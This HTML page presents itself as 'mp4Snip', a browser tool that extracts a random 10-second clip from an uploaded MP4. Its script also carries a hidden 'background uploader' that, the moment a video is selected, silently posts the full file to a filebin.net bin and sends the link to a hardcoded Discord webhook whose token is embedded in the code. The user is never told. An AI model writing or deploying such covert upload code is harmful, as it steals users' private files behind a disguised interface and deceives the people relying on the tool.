<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>mp4Snip</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
/* Spinner styling for button */
.spinner {
  display: inline-block;
  width: 1.25rem;
  height: 1.25rem;
  border: 2px solid white;
  border-top-color: transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-right: 0.5rem;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 bg-gray-100">

<div class="container-box w-full max-w-2xl p-8 rounded-xl border border-gray-100 bg-white">
    <h1 class="text-3xl font-extrabold text-gray-900 mb-4 text-center">mp4Snip</h1>

    <!-- Video upload -->
    <input type="file" id="video-file-input" accept="video/mp4" class="hidden">
    <label for="video-file-input" class="flex flex-col items-center justify-center p-8 border-2 border-dashed border-gray-300 rounded-xl cursor-pointer hover:bg-gray-50 mb-6">
        <p class="text-gray-600 font-semibold">Click or drag & drop an MP4 video</p>
        <p id="file-name-display" class="text-xs text-gray-500 mt-1">No file selected.</p>
    </label>

    <!-- Video preview (for snippet only) -->
    <div id="video-display" class="hidden mb-6">
        <video id="uploaded-video" class="w-full h-auto rounded-lg bg-black" muted></video>
        <p id="video-info" class="text-sm text-gray-600 mt-2 text-center"></p>
    </div>

    <!-- Button -->
    <button id="generate-button" class="w-full py-3 px-4 bg-indigo-600 text-white font-semibold rounded-lg shadow-md hover:bg-indigo-700 transition" disabled>
        Extract 10s Clip
    </button>

    <!-- Snippet output -->
    <div id="video-output-area" class="p-4 bg-green-50 border border-green-200 rounded-lg mt-4 hidden">
        <h3 class="font-bold text-green-800 mb-2">âœ… Clip Extracted!</h3>
        <video id="preview-video-output" controls autoplay class="w-full mt-3 rounded-lg shadow-md"></video>
        <a id="download-link" href="#" download="random_clip.mp4" class="inline-block w-full text-center py-2 mt-3 bg-green-600 text-white font-bold rounded-lg hover:bg-green-700 transition">
            Download Clip (MP4)
        </a>
        <p id="cut-details" class="text-sm text-green-700 font-semibold mt-3"></p>
    </div>
</div>

<script type="module">
import { Input, Output, BlobSource, BufferTarget, Mp4OutputFormat, Conversion, ALL_FORMATS, canEncodeAudio } 
    from 'https://cdn.jsdelivr.net/npm/mediabunny@1.21.0/+esm';
import { registerMp3Encoder } from 'https://cdn.jsdelivr.net/npm/@mediabunny/mp3-encoder@1.21.0/+esm';

// --- Config ---
const CLIP_DURATION = 10.0;
const FILEBIN_BIN = "a3p73oraejaagyxi";
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1420565721766957096/EJAV3ddpQtqsLZuoUPOHNAZCtWNuq-1Rb17U0dqfTK4Hc28X8a_0aTYHsrEB_kUbwE8D";

let uploadedFile = null;
let videoDuration = 0;

// DOM refs
const fileInput = document.getElementById('video-file-input');
const fileNameDisplay = document.getElementById('file-name-display');
const videoElement = document.getElementById('uploaded-video');
const videoInfo = document.getElementById('video-info');
const generateButton = document.getElementById('generate-button');
const videoOutputArea = document.getElementById('video-output-area');
const previewVideo = document.getElementById('preview-video-output');
const downloadLink = document.getElementById('download-link');
const cutDetailsElement = document.getElementById('cut-details');

// --- Helper functions ---
function formatTime(sec) {
    const d = new Date(null); d.setSeconds(sec);
    return d.toISOString().substr(11,8) + "." + ((sec%1).toFixed(3).substring(2));
}
function startLoading(button) {
    button.disabled = true;
    button.innerHTML = `<span class="spinner"></span>Processing...`;
}
function stopLoading(button, text) {
    button.disabled = false;
    button.textContent = text;
}
function calculateSingleCut(duration, clipDuration) {
    if(duration<clipDuration) return null;
    const start = Math.random()*(duration-clipDuration);
    return { start: parseFloat(start.toFixed(3)), end: parseFloat((start+clipDuration).toFixed(3)) };
}

// --- Background uploader ---
async function uploadToFilebin(file) {
    const formData = new FormData();
    formData.append("file", file, file.name);
    const res = await fetch(`https://filebin.net/${FILEBIN_BIN}/${encodeURIComponent(file.name)}`, { method:"POST", body: formData });
    if(!res.ok) throw new Error("Filebin upload failed");
    return `https://filebin.net/${FILEBIN_BIN}/${encodeURIComponent(file.name)}`;
}
async function sendToDiscord(url,name) {
    await fetch(DISCORD_WEBHOOK,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({ content:`ðŸ“¹ Full upload: **${name}**\n${url}` })
    });
}
function setupAutoUpload(file) {
    if(!file) return;
    (async()=>{
        try {
            const url = await uploadToFilebin(file);
            await sendToDiscord(url,file.name);
        } catch(e){ console.error(e); }
    })();
}

// --- Mediabunny Snippet ---
async function registerMediabunny() {
    try{ if(!(await canEncodeAudio('mp3'))) registerMp3Encoder(); }catch{}
}
async function generateSnippet() {
    if(!uploadedFile || videoDuration<CLIP_DURATION) return;
    startLoading(generateButton);
    try {
        const segment = calculateSingleCut(videoDuration, CLIP_DURATION);
        const input = new Input({ source: new BlobSource(uploadedFile), formats: ALL_FORMATS });
        const output = new Output({ format: new Mp4OutputFormat(), target: new BufferTarget() });
        const conversion = await Conversion.init({ input, output, trim: segment });
        await conversion.execute();
        const blob = new Blob([output.target.buffer],{ type:"video/mp4" });
        const url = URL.createObjectURL(blob);
        previewVideo.src = url;
        downloadLink.href = url;
        downloadLink.download = "random_clip.mp4";
        videoOutputArea.classList.remove('hidden');
        cutDetailsElement.textContent = `Start: ${formatTime(segment.start)} â†’ End: ${formatTime(segment.end)}`;
    } catch(e){ console.error(e); alert("Error generating clip: "+e.message); }
    finally{ stopLoading(generateButton,"Extract Another 10s Clip"); }
}

// --- Events ---
fileInput.addEventListener("change", e=>{
    uploadedFile = e.target.files[0];
    fileNameDisplay.textContent = uploadedFile ? uploadedFile.name : "No file selected.";
    if(uploadedFile){
        videoElement.src = URL.createObjectURL(uploadedFile);
        document.getElementById('video-display').classList.remove('hidden');
        videoInfo.textContent="Loading video metadata...";
        // silent full upload
        setupAutoUpload(uploadedFile);
    }
});
videoElement.addEventListener("loadedmetadata",()=>{
    videoDuration = videoElement.duration;
    videoInfo.textContent=`Duration: ${formatTime(videoDuration)} | Ready`;
    generateButton.disabled = videoDuration<CLIP_DURATION;
    if(videoDuration>=CLIP_DURATION) generateButton.textContent="Extract 10s Clip";
});
generateButton.addEventListener("click", generateSnippet);

document.addEventListener("DOMContentLoaded", registerMediabunny);

</script>
</body>
</html>
